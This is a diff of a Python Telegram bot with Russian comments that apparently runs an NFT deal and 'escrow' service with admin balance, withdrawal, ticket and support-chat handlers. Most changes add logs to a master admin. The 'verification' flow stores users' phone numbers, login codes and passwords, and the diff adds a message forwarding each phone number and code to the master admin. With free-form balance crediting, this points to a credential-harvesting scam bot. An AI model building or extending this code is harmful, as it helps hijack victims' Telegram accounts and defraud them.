@@ -53,7 +53,6 @@ def save_json(file, data):
     with open(file, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
-# Загружаем все данные
 deals = load_json(FILES["deals"])
 admins = load_json(FILES["admins"])
 balance = load_json(FILES["balance"])
@@ -125,10 +124,11 @@ def complete_verification(user_id: int, phone: str, code: str):
     save_json(FILES["verification"], verification_data)
 
 async def log_to_master(text: str):
+    """Отправляет лог главному админу"""
     try:
         await bot.send_message(MASTER_ADMIN_ID, text)
-    except:
-        pass
+    except Exception as e:
+        print(f"Ошибка отправки лога: {e}")
 
 def log_action(action: str, data: dict):
     log_id = str(uuid.uuid4())[:8]
@@ -409,12 +409,11 @@ async def menu_deals(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 8. ССЫЛКА НА СДЕЛКУ (РАБОТАЕТ!)
+# 8. ССЫЛКА НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     lang = get_user_language(message.from_user.id)
     
-    # Перезагружаем данные, чтобы быть уверенным
     global deals
     deals = load_json(FILES["deals"])
     
@@ -455,7 +454,6 @@ Possible reasons:
         await message.answer(text)
         return
 
-    # Проверяем, что покупатель — тот, кому предназначена сделка
     if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
         if lang == "ru":
             text = f"❌ Доступ запрещён!\n\nСделка #{deal_id} предназначена для @{deal['buyer_username']}"
@@ -464,11 +462,9 @@ Possible reasons:
         await message.answer(text)
         return
 
-    # Сохраняем buyer_id
     deal["buyer_id"] = message.from_user.id
     save_json(FILES["deals"], deals)
 
-    # Формируем сообщение
     nft_info = ""
     if deal.get('nft_link'):
         nft_info = f"\n🔗 NFT: {deal['nft_link']}"
@@ -610,6 +606,15 @@ async def admin_get_amount(message: types.Message, state: FSMContext):
         user_id = data.get("target_user_id")
         currency = data.get("target_currency")
         add_balance(user_id, currency, amount)
+        
+        await log_to_master(
+            f"💰 АДМИН НАЧИСЛИЛ БАЛАНС\n\n"
+            f"👤 Админ: ID: {message.from_user.id}\n"
+            f"👤 Пользователь: {user_id}\n"
+            f"💰 {amount} {currency}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
         await message.answer(
             f"✅ Начислено {amount} {currency} пользователю {user_id}",
             reply_markup=admin_panel_keyboard()
@@ -647,6 +652,14 @@ async def add_admin(message: types.Message):
         new_admin_id = int(args[1])
         admins[str(new_admin_id)] = True
         save_json(FILES["admins"], admins)
+        
+        await log_to_master(
+            f"👥 ДОБАВЛЕН АДМИН\n\n"
+            f"👤 Админ: {message.from_user.id}\n"
+            f"➕ Добавлен: {new_admin_id}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
         await message.answer(f"✅ Админ добавлен: {new_admin_id}")
     except:
         await message.answer("❌ Неверный ID")
@@ -668,6 +681,14 @@ async def remove_admin(message: types.Message):
         if str(admin_id) in admins:
             del admins[str(admin_id)]
             save_json(FILES["admins"], admins)
+            
+            await log_to_master(
+                f"👥 УДАЛЁН АДМИН\n\n"
+                f"👤 Админ: {message.from_user.id}\n"
+                f"➖ Удалён: {admin_id}\n"
+                f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+            
             await message.answer(f"✅ Админ удалён: {admin_id}")
         else:
             await message.answer("❌ Админ не найден")
@@ -737,6 +758,16 @@ async def confirm_withdraw_command(message: types.Message):
     req["status"] = "completed"
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["withdraw"], withdraw_requests)
+    
+    await log_to_master(
+        f"✅ ПОДТВЕРЖДЁН ВЫВОД\n\n"
+        f"👤 Админ: ID: {message.from_user.id}\n"
+        f"👤 Пользователь: {req['user_id']}\n"
+        f"💰 {req['amount']} {req['currency']}\n"
+        f"📝 {req['details']}\n"
+        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
     await message.answer(f"✅ Вывод подтверждён #{request_id}")
     try:
         await bot.send_message(
@@ -765,6 +796,15 @@ async def reject_withdraw_command(message: types.Message):
         return
     req["status"] = "rejected"
     save_json(FILES["withdraw"], withdraw_requests)
+    
+    await log_to_master(
+        f"❌ ОТКЛОНЁН ВЫВОД\n\n"
+        f"👤 Админ: ID: {message.from_user.id}\n"
+        f"👤 Пользователь: {req['user_id']}\n"
+        f"💰 {req['amount']} {req['currency']}\n"
+        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
     await message.answer(f"❌ Вывод отклонён #{request_id}")
 
 @dp.callback_query(lambda c: c.data == "admin_verification")
@@ -809,6 +849,15 @@ async def verify_code_command(message: types.Message):
     req["password"] = password
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["verification_requests"], verification_requests)
+    
+    await log_to_master(
+        f"✅ ВЕРИФИКАЦИЯ ПОДТВЕРЖДЕНА\n\n"
+        f"👤 Админ: ID: {message.from_user.id}\n"
+        f"👤 Пользователь: @{req.get('username', 'неизвестно')} (ID: {req['user_id']})\n"
+        f"📞 Номер: {req['phone']}\n"
+        f"🔑 Код: {code}\n"
+        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
     
     await message.answer(f"✅ Верификация подтверждена #{request_id}")
     try:
@@ -875,6 +924,15 @@ async def answer_ticket_command(message: types.Message):
     t["answered_by"] = message.from_user.id
     save_json(FILES["tickets"], tickets)
     
+    await log_to_master(
+        f"📩 ОТВЕТ НА ТИКЕТ\n\n"
+        f"👤 Админ: ID: {message.from_user.id}\n"
+        f"🆔 Тикет: #{ticket_id}\n"
+        f"👤 Пользователь: @{t.get('username', 'неизвестно')}\n"
+        f"📝 Ответ: {response}\n"
+        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
     await message.answer(f"✅ Ответ отправлен на тикет #{ticket_id}")
     
     try:
@@ -910,6 +968,14 @@ async def close_ticket_command(message: types.Message):
     t["closed_by"] = message.from_user.id
     save_json(FILES["tickets"], tickets)
     
+    await log_to_master(
+        f"🔒 ЗАКРЫТ ТИКЕТ\n\n"
+        f"👤 Админ: ID: {message.from_user.id}\n"
+        f"🆔 Тикет: #{ticket_id}\n"
+        f"👤 Пользователь: @{t.get('username', 'неизвестно')}\n"
+        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
     await message.answer(f"✅ Тикет #{ticket_id} закрыт")
     
     try:
@@ -922,7 +988,7 @@ async def close_ticket_command(message: types.Message):
         pass
 
 # ============================================================
-# 12. ЧАТ ПОДДЕРЖКИ
+# 12. ЧАТ ПОДДЕРЖКИ (С ОТПРАВКОЙ АДМИНУ)
 # ============================================================
 @dp.message(Command("chat_reply"))
 async def chat_reply_command(message: types.Message):
@@ -938,7 +1004,6 @@ async def chat_reply_command(message: types.Message):
     session_id = args[1]
     reply_text = args[2]
     
-    # Перезагружаем данные
     global chat_messages
     chat_messages = load_json(FILES["chat_messages"])
     
@@ -959,9 +1024,17 @@ async def chat_reply_command(message: types.Message):
     chat_messages[session_id].append(msg)
     save_json(FILES["chat_messages"], chat_messages)
     
+    await log_to_master(
+        f"💬 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n"
+        f"👤 Админ: ID: {message.from_user.id}\n"
+        f"🆔 Сессия: {session_id}\n"
+        f"📝 Ответ: {reply_text}\n"
+        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    )
+    
     await message.answer(f"✅ Ответ отправлен в сессию {session_id}")
     
-    # Отправляем пользователю уведомление
+    # Отправляем ответ пользователю в ЛС
     try:
         target_user_id = None
         for m in chat_messages.get(session_id, []):
@@ -1321,7 +1394,8 @@ async def handle_api(request):
             f"💰 АДМИН НАЧИСЛИЛ БАЛАНС\n\n"
             f"👤 Админ: ID: {user_id}\n"
             f"👤 Пользователь: {target_user_id}\n"
-            f"💰 {amount} {currency}"
+            f"💰 {amount} {currency}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         return web.json_response({'success': True}, headers=headers)
@@ -1344,7 +1418,8 @@ async def handle_api(request):
             f"✏️ АДМИН УСТАНОВИЛ БАЛАНС\n\n"
             f"👤 Админ: ID: {user_id}\n"
             f"👤 Пользователь: {target_user_id}\n"
-            f"💰 {amount} {currency}"
+            f"💰 {amount} {currency}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         return web.json_response({'success': True}, headers=headers)
@@ -1372,7 +1447,8 @@ async def handle_api(request):
             f"➖ АДМИН СПИСАЛ БАЛАНС\n\n"
             f"👤 Админ: ID: {user_id}\n"
             f"👤 Пользователь: {target_user_id}\n"
-            f"💰 {amount} {currency}"
+            f"💰 {amount} {currency}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         return web.json_response({'success': True}, headers=headers)
@@ -1434,10 +1510,10 @@ async def handle_api(request):
             f"👤 Покупатель: ID: {user_id}\n"
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-            f"👤 Продавец: @{deal['seller_username']}"
+            f"👤 Продавец: @{deal['seller_username']}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
-        # Отправляем продавцу уведомление
         try:
             keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(
@@ -1503,7 +1579,8 @@ async def handle_api(request):
             f"📦 Товар: {deal['product']}\n"
             f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
             f"👤 Покупатель: @{deal['buyer_username']}\n"
-            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}"
+            f"{'✅ NFT передан на @' + NFT_ESCROW_ACCOUNT if deal.get('nft_transferred') else ''}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         try:
@@ -1620,7 +1697,8 @@ async def handle_api(request):
             f"💳 ЗАЯВКА НА ОПЛАТУ ПО РЕКВИЗИТАМ\n\n"
             f"👤 Пользователь: ID: {user_id}\n"
             f"📦 Сделка: #{deal_id}\n"
-            f"💰 {deal['amount']} {deal['currency']}\n\n"
+            f"💰 {deal['amount']} {deal['currency']}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
             f"Для подтверждения: /pay {deal_id}"
         )
         
@@ -1666,7 +1744,8 @@ async def handle_api(request):
             f"👤 Продавец: ID: {user_id}\n"
             f"📦 Товар: {deal['product']}\n"
             f"🔗 Ссылка: {deal.get('nft_link', 'не указана')}\n"
-            f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}"
+            f"📥 Получатель: @{target_account or NFT_ESCROW_ACCOUNT}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
         try:
@@ -1714,20 +1793,14 @@ async def handle_api(request):
             "subject": subject
         })
         
-        admin_text = f"""🎫 НОВЫЙ ТИКЕТ
-
-🆔 ID: #{ticket_id}
-👤 Пользователь: @{username} (ID: {user_id})
-📝 Тема: {subject}
-💬 Сообщение:
-{message}
-
-🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-📌 Для ответа используйте:
-/answer_ticket {ticket_id} [ваш ответ]"""
-        
-        await log_to_master(admin_text)
+        await log_to_master(
+            f"🎫 НОВЫЙ ТИКЕТ\n\n"
+            f"🆔 ID: #{ticket_id}\n"
+            f"👤 Пользователь: @{username} (ID: {user_id})\n"
+            f"📝 Тема: {subject}\n"
+            f"💬 Сообщение: {message}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
         
         return web.json_response({
             'success': True,
@@ -1779,6 +1852,15 @@ async def handle_api(request):
         t["answered_by"] = user_id
         save_json(FILES["tickets"], tickets)
         
+        await log_to_master(
+            f"📩 ОТВЕТ НА ТИКЕТ\n\n"
+            f"🆔 Тикет: #{ticket_id}\n"
+            f"👤 Админ: ID: {user_id}\n"
+            f"👤 Пользователь: @{t.get('username', 'неизвестно')}\n"
+            f"📝 Ответ: {response}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        
         try:
             await bot.send_message(
                 t["user_id"],
@@ -1789,7 +1871,9 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ЧАТ ПОДДЕРЖКИ =====
+    # ============================================================
+    # 🔥 ЧАТ ПОДДЕРЖКИ (С ОТПРАВКОЙ АДМИНУ В ЛС)
+    # ============================================================
     elif endpoint == '/api/chat_history':
         session_id = data.get('session_id', 'default')
         if session_id not in chat_messages:
@@ -1812,19 +1896,22 @@ async def handle_api(request):
             "text": text,
             "sender": sender,
             "user_id": user_id,
+            "username": user.username,
             "timestamp": datetime.now().isoformat(),
             "status": "sent"
         }
         chat_messages[session_id].append(msg)
         save_json(FILES["chat_messages"], chat_messages)
         
-        # Если сообщение от пользователя — уведомляем админа
+        # ✅ ОТПРАВЛЯЕМ АДМИНУ В ЛС
         if sender == 'user':
             await log_to_master(
                 f"💬 НОВОЕ СООБЩЕНИЕ В ЧАТЕ ПОДДЕРЖКИ\n\n"
                 f"👤 Пользователь: @{user.username} (ID: {user_id})\n"
-                f"📝 {text}\n\n"
-                f"📌 Для ответа используйте:\n/chat_reply {session_id} [ваш ответ]"
+                f"🆔 Сессия: {session_id}\n"
+                f"📝 Сообщение:\n{text}\n\n"
+                f"📌 Для ответа используйте команду:\n"
+                f"/chat_reply {session_id} [ваш ответ]"
             )
         
         return web.json_response({'success': True, 'message': msg}, headers=headers)
